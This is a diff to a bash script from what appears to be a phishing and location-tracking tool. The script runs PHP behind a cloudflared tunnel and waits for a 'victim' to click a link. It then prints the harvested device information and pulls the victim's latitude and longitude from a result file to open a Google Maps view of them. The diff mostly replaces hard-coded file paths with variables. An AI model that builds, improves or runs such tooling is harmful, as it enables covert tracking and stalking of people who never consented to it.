@@ -67,9 +67,13 @@ if [ ! -d $CWD/logs ]; then
 else
     rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
     rf -rf $Result >/dev/null 2>&1
-    touch $Result >/dev/null 2>&1
     rm -rf $Infos >/dev/null 2>&1
-    touch $Infos >/dev/null 2>&1
+fi
+if [ -e $Result ]; then
+    rm -rf $Result >/dev/null 2>&1
+fi
+if [ -e $Infos ]; then
+    rm -rf $Infos >/dev/null 2>&1
 fi
 killall php cloudflared >/dev/null 2>&1
 cd $CWD/assets/send >/dev/null 2>&1
@@ -120,17 +124,17 @@ xdg-open http://127.0.0.1:8084
 checkFound() {
     printf "\n${SB}WATING FOR RESPOSNSES!!${R0}\n"
     while [ true ]; do
-        if [[ -e $CWD/assets/send/php/info.txt ]]; then
+        if [[ -e $Infos ]]; then
             printf "\n${S2}Victim Clicked on the link ;)!!${R0}\n"
-            cat  $CWD/assets/send/php/info.txt | jq
-            cat $CWD/assets/send/php/info.txt>$CWD/info.log
-            rm -rf $CWD/assets/send/php/info.txt >/dev/null 2>&1
+            cat  $Infos | jq
+            cat $Infos >$CWD/info.log
+            rm -rf $Infos >/dev/null 2>&1
         fi
-        if [[ -e $CWD/assets/send/php/result.txt ]]; then
-            latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
-            longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
+        if [[ -e $Result ]]; then
+            latitude=$(cat $Result | jq -r .info[].lat)
+            longitude=$(cat $Result | jq -r .info[].lon)
             xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
-            rm -rf $CWD/assets/send/php/result.txt >/dev/null 2>&1
+            rm -rf $Result >/dev/null 2>&1
             printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
         fi
     done
